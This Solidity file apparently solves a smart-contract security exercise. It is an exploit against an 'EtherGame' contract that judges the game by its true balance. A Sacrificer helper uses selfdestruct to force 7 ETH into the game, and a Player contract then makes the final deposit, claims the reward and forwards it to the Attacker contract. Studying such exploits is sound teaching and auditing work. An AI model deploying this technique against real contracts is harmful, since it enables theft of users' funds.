// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {EtherGame} from "../src/Problem2.sol";

// A helper contract to forcefully send 7 ETH to EtherGame.
contract Sacrificer {

    // Receives ETH.
    fallback() external payable {}

    // Forcefully sends ETH to the given contract.
    function sendEthTo(EtherGame game) public {
        selfdestruct(payable(address(game)));
    }
}

// A helper contract to play for the Attacker.
contract Player {

    // Receives ETH.
    fallback() external payable {}

    // Calls the game's register() function.
    function register(EtherGame game) public {
        game.register();
    }

    // Deposits the final ETH to the game.
    function deposit(EtherGame game) public {
        game.deposit{value: 1 ether}();
    }

    // Claims the reward and sends it to the attacker.
    function claimReward(EtherGame game, Attacker to) public {
        game.claimReward();
        payable(address(to)).call{value: 10 ether}("");
    }
}

contract Attacker {

    EtherGame public game; // The smart contract to exploit.
    Sacrificer sacrificer; // The helper contract to force send ETH to the game.
    Player player; // The contract to play for the attacker.


    // Initializes the contract variables.
    constructor(EtherGame _game) {
        game = _game;
        sacrificer = new Sacrificer();
        player = new Player();
    }

    // Since EtherGame uses its true balance to check if the
    // game is over, we can force a helper contract to send
    // ETH and then send in the final ETH from the player.
    function attack() public {
        payable(address(sacrificer)).call{value: 7 ether}("");
        sacrificer.sendEthTo(game);

        payable(address(player)).call{value: 1 ether}("");
        player.deposit(game);
    }

    // Calls the players's register() function.
    function register() public {
        player.register(game);
    }

    // Asks the player to claim the reward.
    function claim() public {
        player.claimReward(game, this);
    }

    // Fallback needed to receive the reward.
    fallback() external payable {}
}